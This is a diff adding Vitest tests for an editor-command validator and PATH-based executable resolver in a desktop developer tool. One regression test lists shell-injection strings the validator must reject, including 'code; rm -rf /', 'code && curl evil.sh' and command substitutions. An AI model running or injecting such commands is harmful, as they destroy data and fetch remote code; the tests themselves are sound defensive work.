@@ -1,10 +1,14 @@
 import { describe, expect, it } from 'vitest';
+import path from 'path';
+import { resolveCommandPath } from '../command-path.js';
 import {
   branchNameArg,
   openExternalHttpUrl,
   optionalBaseBranch,
   projectRootArg,
+  resolveEditorExecutable,
   selectMcpJsonDir,
+  validateEditorCommand,
   validateExternalHttpUrl,
   worktreePathArg,
 } from './register.js';
@@ -108,5 +112,159 @@ describe('openExternalHttpUrl', () => {
         throw new Error(`OS refused ${url}`);
       }),
     ).rejects.toThrow('Failed to open external URL');
+  });
+});
+
+/**
+ * PATH as an app launched from the Dock (macOS) or a .desktop file (Linux)
+ * actually sees it. Every editor a user configures lives outside this.
+ */
+const DOCK_PATH = '/usr/bin:/bin:/usr/sbin:/sbin';
+
+describe('validateEditorCommand', () => {
+  it('accepts a plain command name and trims it', () => {
+    expect(validateEditorCommand('  code  ')).toBe('code');
+  });
+
+  it('accepts an absolute path', () => {
+    expect(validateEditorCommand('/usr/local/bin/code')).toBe('/usr/local/bin/code');
+  });
+
+  it('rejects empty and non-string values', () => {
+    expect(() => validateEditorCommand('')).toThrow('editorCommand must be a non-empty string');
+    expect(() => validateEditorCommand('   ')).toThrow('editorCommand must be a non-empty string');
+    expect(() => validateEditorCommand(undefined)).toThrow(
+      'editorCommand must be a non-empty string',
+    );
+    expect(() => validateEditorCommand(42)).toThrow('editorCommand must be a non-empty string');
+  });
+
+  it('still rejects every shell metacharacter the handler used to reject', () => {
+    // Resolution was added after this gate, never in place of it. These cases
+    // are the regression fence for that ordering.
+    for (const cmd of [
+      'code; rm -rf /',
+      'code && curl evil.sh',
+      'code | tee',
+      'code `whoami`',
+      'code $(whoami)',
+      'code > /etc/passwd',
+      'code < /etc/passwd',
+      'code {a,b}',
+      'code [a]',
+      "code 'x'",
+      'code "x"',
+      'code *',
+      'code ?',
+      'code !',
+      'code #',
+      '~/bin/code',
+      'code\\x',
+    ]) {
+      expect(() => validateEditorCommand(cmd)).toThrow('shell metacharacters');
+    }
+  });
+});
+
+describe('resolveEditorExecutable', () => {
+  const okStatus = {
+    state: 'ok' as const,
+    attempts: 1,
+    lastError: null,
+    visiblePath: '/usr/local/bin:/usr/bin:/bin',
+  };
+  const failedStatus = {
+    state: 'failed' as const,
+    attempts: 3,
+    lastError: 'spawn /bin/zsh ETIMEDOUT',
+    visiblePath: DOCK_PATH,
+  };
+
+  it('returns the absolute path so spawn never has to search PATH itself', async () => {
+    await expect(
+      resolveEditorExecutable('code', {
+        waitForEnv: async () => okStatus,
+        resolve: () => '/usr/local/bin/code',
+      }),
+    ).resolves.toBe('/usr/local/bin/code');
+  });
+
+  it('waits for the PATH import before resolving', async () => {
+    // The race the retry introduces: resolving first would consult the stale
+    // PATH and report a perfectly installed editor as missing.
+    const order: string[] = [];
+    await resolveEditorExecutable('code', {
+      waitForEnv: async () => {
+        order.push('wait');
+        return okStatus;
+      },
+      resolve: () => {
+        order.push('resolve');
+        return '/usr/local/bin/code';
+      },
+    });
+    expect(order).toEqual(['wait', 'resolve']);
+  });
+
+  it('blames the editor setting when PATH was imported correctly', async () => {
+    await expect(
+      resolveEditorExecutable('code', {
+        waitForEnv: async () => okStatus,
+        resolve: () => null,
+      }),
+    ).rejects.toThrow(/Could not find "code" in PATH\. Check that it is installed/);
+  });
+
+  it('blames the PATH import when that is what actually failed', async () => {
+    // The whole fix in one assertion: the user set `code`, `code` is installed,
+    // and the reason it will not launch has nothing to do with the setting.
+    await expect(
+      resolveEditorExecutable('code', {
+        waitForEnv: async () => failedStatus,
+        resolve: () => null,
+      }),
+    ).rejects.toThrow(/could not load your shell PATH at startup/);
+  });
+
+  it('shows the PATH it can actually see, so the claim is checkable', async () => {
+    await expect(
+      resolveEditorExecutable('code', {
+        waitForEnv: async () => failedStatus,
+        resolve: () => null,
+      }),
+    ).rejects.toThrow(/\/usr\/bin:\/bin:\/usr\/sbin:\/sbin/);
+  });
+
+  // --- Real resolver, real filesystem, the Dock's PATH ---
+
+  it('reproduces the bug end to end with a real PATH search', async () => {
+    await expect(
+      resolveEditorExecutable('code', {
+        waitForEnv: async () => failedStatus,
+        resolve: (command) => resolveCommandPath(command, { pathValue: DOCK_PATH }),
+      }),
+    ).rejects.toThrow(/Could not find "code"/);
+  });
+
+  it('leaves `open`-style launching working under the Dock PATH', async () => {
+    // macOS `open` lives in /usr/bin and was never affected. Routing everything
+    // through the resolver must not regress the case that already worked.
+    const systemBinary = process.platform === 'darwin' ? 'open' : 'sh';
+    await expect(
+      resolveEditorExecutable(systemBinary, {
+        waitForEnv: async () => failedStatus,
+        resolve: (command) => resolveCommandPath(command, { pathValue: DOCK_PATH }),
+      }),
+    ).resolves.toMatch(/^\/(usr\/)?bin\//);
+  });
+
+  it('finds the same command once the login PATH has been imported', async () => {
+    const loginPath = `${path.dirname(process.execPath)}:${DOCK_PATH}`;
+    await expect(
+      resolveEditorExecutable(path.basename(process.execPath), {
+        waitForEnv: async () => okStatus,
+        resolve: (command) => resolveCommandPath(command, { pathValue: loginPath }),
+      }),
+    ).resolves.toBe(process.execPath);
   });
 });
